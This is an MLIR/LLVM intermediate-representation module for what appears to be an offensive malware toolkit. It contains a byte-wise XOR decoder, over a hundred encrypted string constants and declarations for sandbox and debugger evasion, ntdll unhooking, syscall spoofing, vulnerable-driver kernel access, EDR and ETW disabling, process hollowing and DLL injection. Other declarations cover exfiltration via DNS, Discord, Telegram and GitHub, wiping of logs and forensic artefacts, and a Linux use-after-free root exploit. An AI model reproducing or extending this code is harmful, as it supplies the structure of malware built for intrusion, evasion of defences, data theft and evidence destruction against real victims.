module attributes {dlti.dl_spec = #dlti.dl_spec<!llvm.ptr = dense<64> : vector<4xi64>, i1 = dense<8> : vector<2xi64>, i8 = dense<8> : vector<2xi64>, i16 = dense<16> : vector<2xi64>, i32 = dense<32> : vector<2xi64>, i64 = dense<[32, 64]> : vector<2xi64>, f16 = dense<16> : vector<2xi64>, f64 = dense<64> : vector<2xi64>, f128 = dense<128> : vector<2xi64>, "dlti.endianness" = "little">, llvm.module_asm = [], llvm.target_triple = ""} {
  llvm.mlir.global private unnamed_addr constant @__obfs_key("default_key") {addr_space = 0 : i32}
  llvm.func @f_61ae7c24(%arg0: !llvm.ptr, %arg1: i64) -> !llvm.ptr attributes {sym_visibility = "private"} {
    %0 = llvm.mlir.constant(0 : i64) : i64
    %1 = llvm.mlir.constant(1 : i64) : i64
    %2 = llvm.mlir.constant(77 : i8) : i8
    %3 = llvm.alloca %1 x i64 : (i64) -> !llvm.ptr
    llvm.store %0, %3 : i64, !llvm.ptr
    llvm.br ^bb1
  ^bb1:  // 2 preds: ^bb0, ^bb2
    %4 = llvm.load %3 : !llvm.ptr -> i64
    %5 = llvm.icmp "slt" %4, %arg1 : i64
    llvm.cond_br %5, ^bb2, ^bb3
  ^bb2:  // pred: ^bb1
    %6 = llvm.load %3 : !llvm.ptr -> i64
    %7 = llvm.getelementptr %arg0[%6] : (!llvm.ptr, i64) -> !llvm.ptr, i8
    %8 = llvm.load %7 : !llvm.ptr -> i8
    %9 = llvm.trunc %6 : i64 to i8
    %10 = llvm.sub %8, %9 : i8
    %11 = llvm.xor %10, %2 : i8
    llvm.store %11, %7 : i8, !llvm.ptr
    %12 = llvm.add %6, %1 : i64
    llvm.store %12, %3 : i64, !llvm.ptr
    llvm.br ^bb1
  ^bb3:  // pred: ^bb1
    llvm.return %arg0 : !llvm.ptr
  }
  llvm.mlir.global private @".str.0.enc"("r\0Dt\11~k`Rw\13rKJ#\22\09CM\0FP%- Y\E3FJ+4\1F\E0?\E6\EA\E7\F6I=&\14\13>.6\07<\012'8\0B") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.1.enc"("\09\0B\09\11gKR\1BAIKJ -\E4)") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.2.enc"("\09\0B\09\11\11\1Exp,IKH\1Cs\229]Gi'7\F5\E7\F5\1E57%!`6\E9$\04#8)3\22%\0F\FD7\10><):\1C9 \09\CA\06\22\079:\E6") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.3.enc"("\09\0B\09\11\11\1EZINq\F8\1C\E0\0BRD^C RY-]Z_\E7KR.\09629- :1+&=\14\FD\0D\1A4\030\1D") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.4.enc"("\09\0B\09\11\11\1EsRc\E5\0E\ED\09KQM$Fe\EB6N\\5X\\&\E43\16T%6)5/\F0&''\13'\12") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.5.enc"("\09\0B\09\11\11\1EfT\14\13sh\09Z[8TN '\\-Z&7\E735.\1A789- :\F0\FFK?\14\0A:\F6\1D") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.6.enc"("\09\0B\09\11\11\1EzcXHR\E6\1Ck'E%A-*\\8]_&[\F2\ECQ\7FW\E9 =  -3\EB\E0n&\0D *\091\FD\1F5\15\07=2%\FC\C0!\22K\CC\FE") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.7.enc"("\09\0B\09\11\11\1Eev,TT-U]-\F3\11kkX4-ZY&]-S#\1A\E0E= ?>\F0&+;\0B'\07\11\1D") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.8.enc"(dense<77> : tensor<1xi8>) {addr_space = 0 : i32} : !llvm.array<1 x i8>
  llvm.mlir.global private @".str.9.enc"("Z_H#HQ7\0B") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.10.enc"("@A@]c/Kl,'.") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.11.enc"("_L' ]K]!\EC\09\FE\E6,H[=WG\0EX\EEO^_6/\12") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.12.enc"("KLJFR>") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.13.enc"("r\02t\11eQ[t*\13:.]WN\09X@i']8S^) 6\04") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.14.enc"("r\02t\11VAFoW\13:I\1C_&=TE\10'\E4BZ3] N\E40\0D0%;!>)<<$>\CA<*.45\1D") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.15.enc"("r\0Dt\11eRKpC#:KJQ\1A`T$jPP\FBz)3[IS!\16<&; \EAW($&>\D4\E7\E8\01") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.16.enc"("\09\0B\09\11yV7wAH:-\1C_(NXFa)PD\E9\E1\03") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.17.enc"("\09\0B~1") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.18.enc"("\06+") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.19.enc"("t\0B)") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.20.enc"("\09\0B\09\11\04\1E{p-R0K, SD_\FC \0B") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.21.enc"("bilggal@\7Fq.") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.22.enc"("\09\0B\09\11\04\1Eh2s\13irqv}b\11Ne'Y:+Z'\E7\0F\E4<\09<\229:>!&:\FFKk_\F2*\05\0F)0!\06\0B") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.23.enc"("\09\0B\09\11\04\1Eh2s\13QG\7F}wXB\0A-\EByOZ7\2237(\FD\09+\E9AAN\F6\C0\E7\E7\12\15 \06\F6\1D") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.24.enc"("BL'GYJlpV#RIU :") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.25.enc"("|hkt4(^xG'W\22Q<") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.26.enc"("[FB]c]@sGT<WP<") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.27.enc"("\09\0B\09\11\04\1Eh8s\13irqv}b\11@k'\E485&Z[3&I\1A\E0&:\EA>.)\16\FF9\0F\03(*)\1F") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.28.enc"("\09\0B\09\11\04\1Eh,s\13.") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.29.enc"("\09\04\09P\\A@rGIM\1C].[F]I\1E\\P@+.\1D\1D\08\04") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.30.enc"("\09\0B\09\11\04\1Eh8s\13tI \1C[?PAlT&OZ\E1Z]\F2% \036\22:>\EA-&\15&\12\15'/*+\03\1D") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.31.enc"("r\02t\11\7FA1u[O\0EW$,NDX>a']N]\E100=%0\047/!&\EA\E5\F0\11$=>\FD3 >0\0A\0C\E8?\153\0B< ;\04\E0") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.32.enc"("r\04t\11\7FA1u[O\0EW$,NDX>a']N]\E1%$KP0\19\E0\1A\F4+! <<%+\13'1\E1\024\015\E8\05\04\04\18\F0.;\16\07:\DD2\0E9\15\09\03\02\00\01\E2\E6") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.33.enc"("r\0Dt\11pKFoGIM\1CQzJo\11aj:(-*R&]&+!\1E+'\F4Z\04#/\11>39\E7\E8\F7\1D") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.34.enc"("\09\0B\09\11YxWM\1EKUIW-\1AN'Ii_%=SZ\E9\E7\12") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.35.enc"("\09\0B\09\11\04\1EW`,#U-Q\E2\1A)") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.36.enc"("\09\0B\09\11\04\1Eh2s\13rI]PWM\11\05 ux\F5\E7\01") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.37.enc"("LUYOcJ\\lZ3") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.38.enc"("BL'GYJlsANI<") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.39.enc"("HJ]FJA'") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.40.enc"("\09\0B\09\11\04\1Eh8s\13rI]P\1AOPAlPX\FB\12\E11 #?4\03-8\F4-&->$3;\0E\FD\02\134\0D41-7..\EA") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.41.enc"("r\02t\11YxWM\1EHT- *'ZT@\14T(@\\_\E3$=84\07-\F3\F4\0A") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.42.enc"("\09CBD_/'") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.43.enc"("r\0Dt\11eRKpC#:KJQ\1A`T$jPP\FBr\\'0N/\FD\DDt@Y\E1\EAB'$#?\148\E8\F7\EB\1F") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.44.enc"("\09\0B\09\11qK[`BT1\1CUV\1AHYIi]\EE\FB\07") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.45.enc"("\06G@S\13I\\o+OK-\0B]'8%Gm\1E\04") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.46.enc"("\09\0B\09\11\04\1Eh2s\13ri}pwm\11\05 rY-]Z_\E7OQ1\0AT\22\F4! \07<$+<\0F9\12") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.47.enc"("EBDtPKFo>") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.48.enc"("[FB]_EKFCNJ'HS:") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.49.enc"("@A&]EJSpZ3") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.50.enc"("\09\0B\09\11\04\1Eh8s\13rI]P\1AOPAlPX\FB\12\E179;SK\18\E0'12>\F6%2#+\16:\12") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.51.enc"("EBDtERKpC#:<") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.52.enc"("EFHMc]K\1F[L> <") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.53.enc"("OH@EYB'") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.54.enc"("r\02t\11pgr+]KOKJ\1C*N#>iTP\FB0* &75.\CB\E0\09") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.55.enc"("\09DBMIJZ3-\08\0EHK_VBU*") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.56.enc"("r\0Dt\11qj\12O,H<WJ\1CFA#Ma'\E4X00&6-W0\1F<\E7\FA\E0\0A") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.57.enc"("\09\0B\09\11o\07b+LNU \1C_]HT;\0F\E1\E4\02\F7\1F\F6\07") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.58.enc"("\09\0B\09\11o\07b+eT0JQH\1AZ^N\15_Y*\E9\E1\18\F7\08\F6\1D") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.59.enc"("\09\0B\09\11o\07b+[}^r\1CWP8%$\15XYA+&7\\IR\E7\D5\EF\F9\FA\F9\FF\16") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.60.enc"("\09\0B\09\11o\07b+c$R U\0B]AP@jPP\FBZ)%\\N8/\16<&; \FC\F6\EB\D7\E5\D7\FF\1D") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.61.enc"("r\0Dt\11s,Z\19_OR\1C@T,BP> Z'N1Z\E9\E7\12") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.62.enc"("r\0Dt\11}D^\1FGP:KJQ\1Ao^$e]7@ 0\E3@ +.\1E+'\FA\E0\E0\16") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.63.enc"("\09\0B\09\11o\07b+MX1HKQ\1AH]Ma]YG\07") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.64.enc"("OF'JR/^j-3") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.65.enc"("ZP&ESCl\1EG#K<") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.66.enc"("ZP&]YIlwAV1<") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.67.enc"("JGLN6A[\0B") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.68.enc"("\09\0B\09\11o\07b+MX1 QKV\09[G\159R8S\E1 [7+K\1A,\09") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.69.enc"("CF\\#R]SF)H>W<") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.70.enc"("CF\\#R]SFBNM-<") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.71.enc"("\09\0B\09\11o\07b+|P1T\1CTS8%G\0E,\E46^1&#\12") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.72.enc"("KH&IcS^\1B[3") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.73.enc"("ZCLEP{_t-'U.%<") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.74.enc"("\09\0B\09\11o\07b+N-U]Q--\09YAd\\RF\E9\E1B&&S#\1A\E0\E1\22!+\F6D^J\E0\13?\F25*<16,\F9\0B") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.75.enc"("\09\0B\09\11o\07b+`T:!K*U\09%$aUZ@ \EB\E3@H%/\0E0=1.\EA8)$\FF;h-P\E1\0F012\1A5\14332 \E0") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.76.enc"("r\02t\11zK1p@\22W]/\1CW?P;i^R\FB \\^7N/!\1A\00") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.77.enc"("r\0Dt\11WAK\1FGIM\1C!,\1Az$F\14\\\11Z_&]]7P\FDz8/=&>\041+&=\14\E7\E8\F7\1D") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.78.enc"("\09\0B\09\11o\00b+}KOJJSN\09\E0\FC Jxa\E7J3[I+15") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.79.enc"("A_]!7\10\1C6\EF\E3\14\EC\0A\EA\10\FB\EB\F2\D4\E7\F7\0E*1_Z3(\1D") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.80.enc"("[L&JE(@sqWO ]yNF_=\18\0B") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.81.enc"("kLH#Y(\07\19[\22KS.]RTRIdW-^&*7_Y8J\1C-'K8\C4S$<%+\02P\CC\D1\CF\C3\1D") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.82.enc"("E@CZL{1p]NTJ]W-8P@\1FP\EE7_3&$&\E7\1D") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.83.enc"("\09\0B\09\11\04\1E\07+u\0Ac\1C\7Fpp\09T@d;S@]5\E3&IR3\1E#2&-.\F61=#\E08:3-\04\1F") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.84.enc"("LSKFP>") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.85.enc"("JOCt7AK`.3") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.86.enc"("JFCO]CJ\19[W.") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.87.enc"("\09\0B\09\11o\00b+}KOJJSN\09\E3\FC wrJ\E7U6]H/I5") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.88.enc"("[L&JE(@s\00R\F0\0AHI]N]*") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.89.enc"("E@CZL{1p-TO._T\E4D!;\DD\0B") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.90.enc"("\09\0B\09\11\04\1E\07+u\0Ac\1CpvM\09%=j]YO\E7Z033&I\1E7!1.\0A") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.91.enc"("MA&tHQ]u[O.") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.92.enc"("\09\0B\09\11o\00b+}KOJJSN\09\E2\FC w]* \\1#\F2Y0\13($;#\0A") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.93.enc"("cfvhm\1Est@$F\1CNS-BP$\1FS\E4Z\\R3[780\D5\15\E9@\22\04-1+\F1\E0*") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.94.enc"("\05\0Bb!Y(F\1FGNT-\E6\1C:") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.95.enc"("\05\0BdDXQSp-\E5\0E<") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.96.enc"("A_]!7\10\1C6ZH1]K*V\07RGm\1E%+^\1C4 <,J`/8\FB\04/\07-$\09!\12\1D") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.97.enc"("\09\0B\09\11\04\1E\07+u\0Ac\1CpW-H^$d\EB+D!Y\\Z5\E4<\14<&\22-\0A") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.98.enc"("M@&PS([F)T@TKIU)") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.99.enc"("M@&PS([F]\ED.") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.100.enc"("r\02t\11qQS\1FG\0CAT]VPB]\0Ae#Z@S51$&SJ\1F\E0;1).1\10") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.101.enc"("r\0Dt\11{A]p,P:KJQ\1An$Ni'\E4MZ1\\9&\12\0B\DF\00") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.102.enc"("\09\0B\09\11\01\19\02+dnauE\1CnF_=\18\EBVD0Z\229=,\FDt(.= \EA8\C2\E7(+\17\223\13\04\FF\F8\FE\D5\12") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.103.enc"("\09\0B\09\11s.Z\19_'WIJ-\1AB)M\1F (D[\EB\E3\07") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.104.enc"("\09\0B\09\11\7FA1u[O\0EW$,NDX>\0F\EB%7+Z^7&/1\CB\E0\09") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.105.enc"("\09\0B\09\11YxWM\1EKUIW-\1AMT:l^-D[\EB\E3\07") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.106.enc"("\09\0B\09\11\7FA1u[O\0EOKP'ET; _S8[Z'\F1\F2\04") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.107.enc"("\09\0B\09\11yVEtB'0S WQG\11KhTRAZ]0\F1\F2\F5\FD\DDGMZ\E6\EAJF6\EB\E0n&\0D *\091\F2\08") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.108.enc"("\09\0B\09\11hF1p_'\0ES/-W8\22Ee](\F5\E7\01") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.109.enc"("\09\0B\09\11VK\\\1F\1EPA]Q--\09^4\14T]AZ%\E9\E7\12") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.110.enc"("r\02t\11eQ[t*\13:.]WN\09]GcVYG\E7&]#\F260\16,6\F4(!\04\F087\10\15\03\06\01") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.111.enc"("r\0Dt\11~k`Rw\13rKJ#\22\09CM\0FP%- Y\E3FJ+4\1F\E0?\E6\EA\E7\F6M/\22!?\09+4+\FFZ0%\02'\04\068\FA") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.112.enc"("\09\0B\09\11WRF\1F+\22\F8\1C}HN\09\221\0F'YL0\E1\\776<\09)$:)&\16") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.113.enc"("\09\0B\09\11TA1\1AG\22:WJ]W\F3\11fGx\11=&0&#\F2S3\D5/\22& /\22\F00$$?!7\E1)*<9-6\0B") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.114.enc"("\09\0B\09\11y,F\1AGNT\E6\1C\7F]=X8e\EB*@&\E1&IBJ\FD\03--=\04/7<<$>\CA>(-\FD+68\E83'\04\0B=\17\10\E0") {addr_space = 0 : i32}
  llvm.mlir.global external @g_a0b3b851() {addr_space = 0 : i32} : !llvm.ptr {
    %0 = llvm.mlir.zero : !llvm.ptr
    llvm.return %0 : !llvm.ptr
  }
  llvm.mlir.global external @g_a61efe88() {addr_space = 0 : i32} : !llvm.ptr {
    %0 = llvm.mlir.zero : !llvm.ptr
    llvm.return %0 : !llvm.ptr
  }
  llvm.mlir.global external @g_eb7aa1a1() {addr_space = 0 : i32} : !llvm.ptr {
    %0 = llvm.mlir.zero : !llvm.ptr
    llvm.return %0 : !llvm.ptr
  }
  llvm.mlir.global external @g_40a54151() {addr_space = 0 : i32} : !llvm.ptr {
    %0 = llvm.mlir.zero : !llvm.ptr
    llvm.return %0 : !llvm.ptr
  }
  llvm.mlir.global external @g_d122d020() {addr_space = 0 : i32} : !llvm.ptr {
    %0 = llvm.mlir.zero : !llvm.ptr
    llvm.return %0 : !llvm.ptr
  }
  llvm.mlir.global external @g_9db24be5() {addr_space = 0 : i32} : !llvm.ptr {
    %0 = llvm.mlir.zero : !llvm.ptr
    llvm.return %0 : !llvm.ptr
  }
  llvm.mlir.global external @MAX_INFERENCE_TIME_MS(100 : i32) {addr_space = 0 : i32} : i32
  llvm.mlir.global external @audit_log_initialized(false) {addr_space = 0 : i32} : i1
  llvm.mlir.global external @threat_score(0.000000e+00 : f64) {addr_space = 0 : i32} : f64
  llvm.mlir.global external @g_95bd4817() {addr_space = 0 : i32} : !llvm.array<0 x ptr> {
    %0 = llvm.mlir.undef : !llvm.array<0 x ptr>
    llvm.return %0 : !llvm.array<0 x ptr>
  }
  llvm.mlir.global external @g_b7bfea9b() {addr_space = 0 : i32} : !llvm.array<0 x ptr> {
    %0 = llvm.mlir.undef : !llvm.array<0 x ptr>
    llvm.return %0 : !llvm.array<0 x ptr>
  }
  llvm.mlir.global external @g_e836b4e8() {addr_space = 0 : i32} : !llvm.array<0 x ptr> {
    %0 = llvm.mlir.undef : !llvm.array<0 x ptr>
    llvm.return %0 : !llvm.array<0 x ptr>
  }
  llvm.mlir.global external @ai_engine_ready(false) {addr_space = 0 : i32} : i1
  llvm.mlir.global external @operations_count(0 : i32) {addr_space = 0 : i32} : i32
  llvm.mlir.global external @root_access_obtained(false) {addr_space = 0 : i32} : i1
  llvm.func @puts(!llvm.ptr) -> i32
  llvm.func @printf(!llvm.ptr, ...) -> i32
  llvm.func @println(!llvm.ptr)
  llvm.func @string(i64) -> !llvm.ptr
  llvm.func @jocky_str_concat(!llvm.ptr, !llvm.ptr) -> !llvm.ptr
  llvm.func @malloc(i64) -> !llvm.ptr
  llvm.func @free(!llvm.ptr)
  llvm.func @memset(!llvm.ptr, i32, i64) -> !llvm.ptr
  llvm.func @memcpy(!llvm.ptr, !llvm.ptr, i64) -> !llvm.ptr
  llvm.func @strlen(!llvm.ptr) -> i64
  llvm.func @exit(i32)
  llvm.func @array_len(!llvm.ptr) -> i64
  llvm.func @array_append(!llvm.ptr, !llvm.ptr) -> !llvm.ptr
  llvm.func @jocky_alloc(i64) -> !llvm.ptr
  llvm.func @jocky_free(!llvm.ptr)
  llvm.func @jocky_byovd_new() -> !llvm.ptr
  llvm.func @jocky_byovd_destroy(!llvm.ptr)
  llvm.func @jocky_runtime_init() -> i32
  llvm.func @jocky_check_analysis_environment() -> i32
  llvm.func @jocky_is_debugger_present() -> i1
  llvm.func @jocky_is_vm() -> i1
  llvm.func @jocky_is_sandbox() -> i1
  llvm.func @jocky_sleep_and_recheck()
  llvm.func @jocky_decrypt_xor(!llvm.ptr, i32, i8, i32)
  llvm.func @jocky_decrypt_rc4(!llvm.ptr, i32, !llvm.ptr, i32)
  llvm.func @jocky_unhook_ntdll() -> i1
  llvm.func @jocky_get_syscall_number(!llvm.ptr) -> i32
  llvm.func @jocky_spoof_call(!llvm.ptr, i64, i64, i64, i64) -> i64
  llvm.func @jocky_spoof_syscall(i32, i64, i64, i64, i64) -> i64
  llvm.func @jocky_byovd_load(!llvm.ptr, !llvm.ptr, !llvm.ptr) -> i1
  llvm.func @jocky_byovd_unload(!llvm.ptr)
  llvm.func @jocky_driver_read_phys(!llvm.ptr, i64, !llvm.ptr, i32) -> i1
  llvm.func @jocky_driver_write_phys(!llvm.ptr, i64, !llvm.ptr, i32) -> i1
  llvm.func @jocky_driver_map_kernel(!llvm.ptr, i64, i32) -> !llvm.ptr
  llvm.func @jocky_kread(!llvm.ptr, i64, !llvm.ptr, i32) -> i1
  llvm.func @jocky_kwrite(!llvm.ptr, i64, !llvm.ptr, i32) -> i1
  llvm.func @jocky_disable_edr_callbacks(!llvm.ptr) -> i32
  llvm.func @jocky_disable_etw(!llvm.ptr) -> i1
  llvm.func @jocky_elevate_token(!llvm.ptr, i32) -> i1
  llvm.func @jocky_process_hollow(!llvm.ptr, !llvm.ptr, i32) -> i1
  llvm.func @jocky_module_stomp(!llvm.ptr, !llvm.ptr, i32) -> i1
  llvm.func @jocky_rdll_inject(i32, !llvm.ptr, i32) -> i1
  llvm.func @jocky_thread_hijack(i32, !llvm.ptr, i32) -> i1
  llvm.func @jocky_exfil_encrypt(!llvm.ptr, i32, !llvm.ptr, i32)
  llvm.func @jocky_exfil_front(!llvm.ptr, !llvm.ptr, !llvm.ptr, !llvm.ptr, i32) -> i1
  llvm.func @jocky_exfil_dns(!llvm.ptr, !llvm.ptr, i32) -> i1
  llvm.func @jocky_exfil_discord(!llvm.ptr, !llvm.ptr, i32) -> i1
  llvm.func @jocky_exfil_telegram(!llvm.ptr, !llvm.ptr, !llvm.ptr, i32) -> i1
  llvm.func @jocky_exfil_github(!llvm.ptr, !llvm.ptr, !llvm.ptr, i32) -> i1
  llvm.func @jocky_self_delete()
  llvm.func @jocky_clear_logs()
  llvm.func @jocky_wipe_artifacts(!llvm.ptr)
  llvm.func @jocky_wipe_prefetch()
  llvm.func @jocky_patch_shimcache() -> i1
  llvm.func @jocky_patch_amcache() -> i1
  llvm.func @jocky_clear_srum() -> i1
  llvm.func @jocky_cleanup_all()
  llvm.func @forensics_wipe_powershell_history() -> i32
  llvm.func @forensics_wipe_cmd_history() -> i32
  llvm.func @forensics_flush_arp_cache() -> i32
  llvm.func @forensics_clear_dns_cache() -> i32
  llvm.func @linux_forensics_wipe_bash_history() -> i32
  llvm.func @jocky_linux_cleanup_syslog() -> i32
  llvm.func @jocky_linux_cleanup_journal() -> i32
  llvm.func @jocky_cleanup_event_logs(!llvm.ptr) -> i32
  llvm.func @jocky_cleanup_usn_journal() -> i32
  llvm.func @fs_exists(!llvm.ptr) -> i1
  llvm.func @fs_list_files(!llvm.ptr, i1) -> !llvm.ptr
  llvm.func @fs_file_size(!llvm.ptr) -> i64
  llvm.func @fs_read_file(!llvm.ptr) -> !llvm.ptr
  llvm.func @fs_write_file(!llvm.ptr, !llvm.ptr, i64) -> i1
  llvm.func @crypto_generate_key(i32) -> !llvm.ptr
  llvm.func @crypto_aes256_encrypt(!llvm.ptr, i32, !llvm.ptr) -> !llvm.ptr
  llvm.func @crypto_aes256_decrypt(!llvm.ptr, i32, !llvm.ptr) -> !llvm.ptr
  llvm.func @sandbox_spawn(!llvm.ptr, !llvm.ptr) -> i32
  llvm.func @sandbox_set_limits(i32, i64, i32, i64) -> i1
  llvm.func @sandbox_monitor(i32) -> i32
  llvm.func @sandbox_wait(i32) -> i32
  llvm.func @sandbox_export_trace(i32, !llvm.ptr) -> i1
  llvm.func @jocky_registry_create_key(i32, !llvm.ptr, !llvm.ptr) -> i1
  llvm.func @jocky_registry_set_value(!llvm.ptr, !llvm.ptr, !llvm.ptr, i32, i32) -> i1
  llvm.func @jocky_registry_close_key(!llvm.ptr) -> i1
  llvm.func @audit_log(!llvm.ptr, !llvm.ptr, !llvm.ptr, !llvm.ptr)
  llvm.func @audit_init(i32) -> i1
  llvm.func @audit_export(!llvm.ptr) -> i1
  llvm.func @audit_verify() -> i32
  llvm.func @provenance_record(!llvm.ptr, !llvm.ptr, !llvm.ptr)
  llvm.func @ai_init() -> i32
  llvm.func @ai_collect_telemetry() -> !llvm.ptr
  llvm.func @ai_score_threat() -> f64
  llvm.func @byovd_load_driver(!llvm.ptr) -> i32
  llvm.func @byovd_test_exploit(i32) -> i32
  llvm.func @btr_disable_notifications() -> i1
  llvm.func @btr_mask_module(!llvm.ptr) -> i1
  llvm.func @jocky_exploit_disable_callbacks() -> i32
  llvm.func @jocky_exploit_token_replacement(i32, i32) -> i32
  llvm.func @edrhoker_detect() -> i1
  llvm.func @blindside_unhook_ntdll() -> i1
  llvm.func @exfil_dns_tunnel(!llvm.ptr, !llvm.ptr) -> i32
  llvm.func @exfil_discord_webhook(!llvm.ptr, !llvm.ptr) -> i32
  llvm.func @exfil_local_cdn(!llvm.ptr, !llvm.ptr, !llvm.ptr, !llvm.ptr) -> i32
  llvm.func @jocky_module_load(!llvm.ptr) -> !llvm.ptr
  llvm.func @jocky_module_unload(!llvm.ptr) -> i1
  llvm.func @jocky_module_has_symbol(!llvm.ptr, !llvm.ptr) -> i1
  llvm.func @jocky_module_base(!llvm.ptr) -> i64
  llvm.func @jocky_module_resolve_symbol(!llvm.ptr, !llvm.ptr) -> !llvm.ptr
  llvm.func @jocky_process_hollow_linux(i32, !llvm.ptr, i64) -> i1
  llvm.func @jocky_process_ptrace_attach(i32) -> i32
  llvm.func @jocky_process_ptrace_detach(i32) -> i32
  llvm.func @jocky_process_get_maps(i32, !llvm.ptr, i64) -> i32
  llvm.func @jocky_fence2pwn_detect_kfence() -> i32
  llvm.func @jocky_fence2pwn_get_pool_info(!llvm.ptr) -> i32
  llvm.func @jocky_fence2pwn_trigger_allocations(i64, i32) -> i32
  llvm.func @jocky_fence2pwn_exploit_uaf(i32, i32, !llvm.ptr) -> i32
  llvm.func @jocky_fence2pwn_manipulate_creds(i32, i32) -> i32
  llvm.func @jocky_fence2pwn_allocate_cred_objects(i32) -> i32
  llvm.func @jocky_fence2pwn_write_cred(!llvm.ptr, i32, i32) -> i32
  llvm.func @jocky_fence2pwn_trigger_reclamation() -> i32
  llvm.func @jocky_fence2pwn_elevate_to_root() -> i32
  llvm.func @jocky_fence2pwn_find_uaf_primitive() -> i32
